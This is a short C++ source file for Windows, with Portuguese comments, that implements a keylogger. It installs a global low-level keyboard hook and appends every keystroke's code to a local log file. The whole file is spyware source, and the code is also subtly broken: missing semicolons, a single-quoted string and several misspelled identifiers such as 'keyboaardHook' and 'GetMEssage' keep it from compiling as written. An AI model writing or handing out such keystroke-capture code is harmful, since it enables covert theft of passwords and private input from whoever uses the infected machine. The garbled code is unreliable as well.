#include <windows.h>
#include <fstream>

//Função para capturar teclas

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        std::ofstream logfile('keylog.txt', std::ios_base::app);
        logfile << (char)pKeyboard->vkCode;
        logfile.close()
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//Função Pricipal
int main() {
    //Instalar hook do teclado
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboaardHook){
        MessageBox(NULL, "Falha ao instalar hook!", "Erro", MB_ICONERROR);
        return 1
    }
    //Loop de mensagens
    MSG msg;
    while (GetMEssage(&msg, NULL, 0, 0)) {
        tranlateMessage(&msg);
        DispatchMessage(&msg);
    }
    //desinstalar Hook
    UnhookWindownsHookEx(keyboardHook);
    return 0;
}